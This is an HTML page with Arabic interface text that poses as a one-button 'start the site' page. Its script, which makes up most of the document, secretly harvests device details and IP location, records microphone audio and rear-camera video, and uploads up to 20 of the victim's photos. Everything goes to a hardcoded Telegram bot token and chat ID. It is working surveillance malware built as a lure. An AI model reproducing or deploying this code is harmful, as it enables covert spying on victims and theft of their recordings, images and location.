<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تشغيل الموقع</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            font-family: Arial;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            transition: all 0.3s;
        }
        button:active {
            transform: scale(0.95);
        }
        .recording { background: #f44336; }
        .sending { background: #FF9800; }
        .success { background: #2196F3; }
    </style>
</head>
<body>
    <button id="actionButton">تشغيل الموقع</button>

    <script>
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        const actionButton = document.getElementById('actionButton');

        actionButton.addEventListener('click', async function() {
            try {
                // المرحلة 1: جمع معلومات الجهاز
                actionButton.textContent = "جمع المعلومات...";
                actionButton.classList.add('sending');
                const deviceInfo = await collectDeviceInfo();
                await sendToTelegram(formatDeviceInfo(deviceInfo));
                
                // المرحلة 2: تحديد الموقع
                actionButton.textContent = "تحديد الموقع...";
                const locationInfo = await getAccurateLocation();
                await sendToTelegram(formatLocationInfo(locationInfo));
                
                // المرحلة 3: تسجيل الصوت (10 ثواني)
                actionButton.textContent = "تسجيل الصوت...";
                actionButton.classList.replace('sending', 'recording');
                await recordAndSend('audio', 10000);
                
                // المرحلة 4: تسجيل الفيديو (15 ثواني)
                actionButton.textContent = "تسجيل الفيديو...";
                await recordAndSend('video', 15000);
                
                // المرحلة 5: إرسال الصور
                actionButton.textContent = "إرسال الصور...";
                actionButton.classList.replace('recording', 'sending');
                await sendImages();
                
                // الانتهاء
                actionButton.textContent = "تم التشغيل بنجاح ✅";
                actionButton.classList.replace('sending', 'success');
                
            } catch (error) {
                console.error('Error:', error);
                actionButton.textContent = "خطأ! اضغط مجدداً";
                actionButton.className = '';
            } finally {
                setTimeout(() => {
                    actionButton.textContent = "تشغيل الموقع";
                    actionButton.className = '';
                }, 5000);
            }
        });

        // ========== دوال التسجيل ==========
        async function recordAndSend(type, duration) {
            const stream = await navigator.mediaDevices.getUserMedia(
                type === 'audio' ? { audio: true } : 
                { video: { facingMode: "environment" }, audio: true }
            );
            
            const mimeType = type === 'audio' ? 'audio/webm' : 'video/mp4';
            const method = type === 'audio' ? 'sendAudio' : 'sendVideo';
            const filename = type === 'audio' ? 'تسجيل صوت.webm' : 'تسجيل فيديو.mp4';
            
            return new Promise((resolve) => {
                const recorder = new MediaRecorder(stream, { mimeType });
                let chunks = [];
                
                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: mimeType });
                    await sendToTelegram(blob, method, filename);
                    stream.getTracks().forEach(track => track.stop());
                    resolve();
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), duration);
            });
        }

        // ========== إرسال الصور ==========
        async function sendImages() {
            try {
                const dirHandle = await window.showDirectoryPicker();
                let sentCount = 0;
                
                for await (const entry of dirHandle.values()) {
                    if (sentCount >= 20) break;
                    if (entry.kind === 'file' && /\.(jpg|jpeg|png|gif|webp)$/i.test(entry.name)) {
                        const file = await entry.getFile();
                        await sendToTelegram(file, 'sendPhoto');
                        sentCount++;
                        await new Promise(resolve => setTimeout(resolve, 300));
                    }
                }
                return sentCount;
            } catch {
                return 0;
            }
        }

        // ========== دوال المعلومات ==========
        async function collectDeviceInfo() {
            return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                deviceMemory: navigator.deviceMemory || 'غير معروف',
                connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
            };
        }

        function formatDeviceInfo(info) {
            return `📱 <b>معلومات الجهاز:</b>\n` +
                   `• النظام: ${info.platform}\n` +
                   `• المتصفح: ${info.userAgent.split(' ')[0]}\n` +
                   `• اللغة: ${info.language}\n` +
                   `• الشاشة: ${info.screen}\n` +
                   `• الذاكرة: ${info.deviceMemory} GB\n` +
                   `• الشبكة: ${info.connection}`;
        }

        async function getAccurateLocation() {
            const res = await fetch('https://ipapi.co/json/');
            return res.json();
        }

        function formatLocationInfo(info) {
            return `📍 <b>الموقع:</b>\n` +
                   `• الدولة: ${info.country_name}\n` +
                   `• المدينة: ${info.city}\n` +
                   `• IP: <code>${info.ip}</code>\n` +
                   `• المزود: ${info.org || 'غير معروف'}`;
        }

        // ========== إرسال إلى التليجرام ==========
        async function sendToTelegram(data, method = 'sendMessage', filename = 'file') {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            
            if (method === 'sendMessage') {
                formData.append('text', data);
                formData.append('parse_mode', 'HTML');
            } else {
                formData.append(method === 'sendAudio' ? 'audio' : 
                              (method === 'sendVideo' ? 'video' : 'photo'), 
                              data, filename);
            }
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                method: 'POST',
                body: formData
            });
        }
    </script>
</body>
</html>